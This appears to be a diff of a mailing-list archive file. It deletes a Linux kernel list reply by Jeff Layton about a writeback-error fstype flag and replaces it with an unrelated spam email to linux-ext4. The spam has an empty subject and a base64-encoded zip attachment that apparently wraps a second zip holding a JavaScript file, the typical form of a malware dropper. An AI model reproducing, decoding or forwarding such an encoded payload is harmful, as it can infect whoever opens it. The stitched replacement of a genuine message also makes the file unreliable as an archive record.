@@ -1,70 +1,75 @@
-From: Jeff Layton <jlayton@redhat.com>
-Subject: Re: [PATCH v6 12/20] fs: add a new fstype flag to indicate how
- writeback errors are tracked
-Date: Wed, 14 Jun 2017 13:24:43 -0400
-Message-ID: <1497461083.6752.7.camel@redhat.com>
-References: <20170612122316.13244-1-jlayton@redhat.com>
-	 <20170612122316.13244-15-jlayton@redhat.com>
-	 <20170612124513.GC18360@infradead.org> <1497349472.5762.1.camel@redhat.com>
-	 <20170614064731.GB3598@infradead.org>
+From: <koopk@madisonnjps.org>
+Subject: (unknown)
+Date: Wed, 14 Jun 2017 21:25:16 -0000
+Message-ID: <149747551659.12490.14937035272747235017@saturn-internet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-Cc: Andrew Morton <akpm@linux-foundation.org>, Al Viro
- <viro@ZenIV.linux.org.uk>,  Jan Kara <jack@suse.cz>, tytso@mit.edu,
- axboe@kernel.dk, mawilcox@microsoft.com,  ross.zwisler@linux.intel.com,
- corbet@lwn.net, Chris Mason <clm@fb.com>, Josef Bacik <jbacik@fb.com>,
- David Sterba <dsterba@suse.com>, "Darrick J . Wong"
- <darrick.wong@oracle.com>, linux-fsdevel@vger.kernel.org,
- linux-mm@kvack.org,  linux-ext4@vger.kernel.org, linux-xfs@vger.kernel.org,
-  linux-btrfs@vger.kernel.org, linux-block@vger.kernel.org
-To: Christoph Hellwig <hch@infradead.org>
-Return-path: <owner-linux-mm@kvack.org>
-In-Reply-To: <20170614064731.GB3598@infradead.org>
-Sender: owner-linux-mm@kvack.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="927328920469.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from 178.161.230.129.dyn.v4.saturn-internet.ru ([178.161.230.129]:57113
+        "HELO saturn-internet.ru" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751760AbdFNVZU (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>);
+        Wed, 14 Jun 2017 17:25:20 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-On Tue, 2017-06-13 at 23:47 -0700, Christoph Hellwig wrote:
-> On Tue, Jun 13, 2017 at 06:24:32AM -0400, Jeff Layton wrote:
-> > That's definitely what I want for the endgame here. My plan was to add
-> > this flag for now, and then eventually reverse it (or drop it) once all
-> > or most filesystems are converted.
-> > 
-> > We can do it that way from the get-go if you like. It'll mean tossing in
-> >  a patch add this flag to all filesystems that have an fsync operation
-> > and that use the pagecache, and then gradually remove it from them as we
-> > convert them.
-> > 
-> > Which method do you prefer?
-> 
-> Please do it from the get-go.  Or in fact figure out if we can get
-> away without it entirely.  Moving the error reporting into ->fsync
-> should help greatly with that, so what's missing after that?
-
-In this smaller set, it's only really used for DAX. In the larger patch
-series I have (which needs updating on top of this), there are other
-things that key off of it:
-
-sync_file_range: ->fsync isn't called directly there, and I think we
-probably want similar semantics to fsync() for it
-
-JBD2: will try to re-set the error after clearing it with
-filemap_fdatawait. That's problematic with the new infrastructure so we
-need some way to avoid it.
-
-What I think I'll do for now is add a new FS_DAX_WB_ERRSEQ flag that
-will go away by the end of the series. As the need arises for a similar
-flag in other areas, I'll add them then.
-
-The overall goal is not to need these flags. It may take a bit of time
-to get there though.
-
-Thanks for the review so far!
--- 
-Jeff Layton <jlayton@redhat.com>
-
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+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
